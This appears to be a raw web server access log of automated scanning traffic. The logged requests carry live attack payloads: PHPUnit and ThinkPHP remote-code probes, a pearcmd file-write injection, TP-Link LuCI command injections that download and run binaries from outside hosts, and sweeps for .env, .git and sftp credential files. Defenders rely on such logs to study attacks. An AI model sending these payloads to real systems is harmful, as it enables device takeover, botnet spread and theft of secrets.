INFO:     101.44.222.193:0 - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0" 200 OK
INFO:     222.94.32.241:0 - "GET / HTTP/1.0" 200 OK
INFO:     118.212.120.247:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     34.77.99.191:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     73.102.224.54:0 - "GET / HTTP/1.0" 200 OK
INFO:     117.235.253.184:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     207.90.244.2:0 - "GET / HTTP/1.0" 200 OK
INFO:     207.90.244.2:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     207.90.244.2:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
INFO:     207.90.244.2:0 - "GET /.well-known/security.txt HTTP/1.0" 200 OK
INFO:     207.90.244.2:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.216.150.65:0 - "GET / HTTP/1.0" 200 OK
INFO:     114.73.40.160:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.239.222.34:0 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     91.92.244.183:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     91.92.244.183:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     172.168.40.201:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     110.175.120.61:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     37.252.65.209:0 - "GET / HTTP/1.0" 200 OK
INFO:     217.174.186.154:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     51.158.205.47:0 - "GET / HTTP/1.0" 200 OK
INFO:     200.8.56.127:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET / HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     118.193.57.62:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     101.36.116.45:0 - "GET / HTTP/1.0" 200 OK
INFO:     101.36.116.45:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     101.36.116.45:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     101.36.116.45:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
INFO:     101.36.116.45:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     101.36.116.45:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     78.153.140.179:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     52.76.71.100:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "POST /boaform/admin/formLogin HTTP/1.0" 405 Method Not Allowed
INFO:     71.6.232.22:0 - "GET / HTTP/1.0" 200 OK
INFO:     198.235.24.170:0 - "GET / HTTP/1.0" 200 OK
INFO:     34.76.144.38:0 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
INFO:     64.62.197.30:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.21:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.197.26:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.197.23:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     34.140.63.218:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     95.252.54.114:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     151.237.78.207:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     51.120.0.66:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     109.248.252.6:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     188.75.79.55:0 - "GET / HTTP/1.0" 200 OK
INFO:     106.75.137.241:0 - "GET /.DS_Store HTTP/1.0" 404 Not Found
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     94.156.68.162:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     20.127.146.25:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     20.127.146.25:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.174.191.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.164:0 - "POST /login HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     202.212.75.55:0 - "GET / HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //local/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dev HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //sitemaps/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.prod.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //kyc/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //system/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //sistema/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //admin/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.prod HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.backup HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //vendor/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //v1/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dev.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //asset/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //web/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //club/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //Lara/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api2/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.save HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //lib/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.stage HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //public/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //app/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //webs/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //ADMIN/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //backup/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/laravel/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //lab/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //en/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //administrator/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.bak HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //prod/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/app/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //main/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //public/.env.dev HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.production.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //dev/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.production HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //beta/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //l53/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //NEW/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/laravel_inbox/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/Database/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //database/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //resources/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //staging/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env_sample HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //site/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //assets/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //cron/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //config/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //laravel/core/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.live HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //apps/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //tools/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api3/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dist HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env_1 HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //home/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.development HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //backend/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //website/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //fileweb/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.old HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //content/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.development.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //laravel/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //cronlab/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //development/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //production/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //uploads/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //local/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dev HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //sitemaps/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.prod.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //kyc/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //system/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //sistema/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //admin/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.prod HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.backup HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //vendor/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //v1/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dev.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //asset/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //web/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //club/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //Lara/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api2/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.save HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //lib/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.stage HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //public/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //app/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //webs/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //ADMIN/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //backup/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/laravel/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //lab/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //en/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //administrator/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.bak HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //prod/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/app/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //main/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //public/.env.dev HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.production.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //dev/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.production HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //beta/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //l53/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //NEW/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //clientes/laravel_inbox/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //core/Database/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //database/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //resources/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //staging/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env_sample HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //site/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //assets/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //cron/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //config/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //laravel/core/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.live HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api/shared/config/config.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //apps/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //tools/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //api3/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.dist HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env_1 HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //home/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.development HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //backend/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //website/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //fileweb/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.old HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //content/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //.env.development.local HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //laravel/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //cronlab/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //development/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //production/.env HTTP/1.0" 200 OK
INFO:     209.97.175.187:0 - "GET //uploads/.env HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.15.38.89:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "POST /boaform/admin/formLogin HTTP/1.0" 405 Method Not Allowed
INFO:     78.153.140.177:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     188.16.170.174:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     106.75.18.235:0 - "GET /.vscode/sftp.json HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET /favicon.png HTTP/1.0" 404 Not Found
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
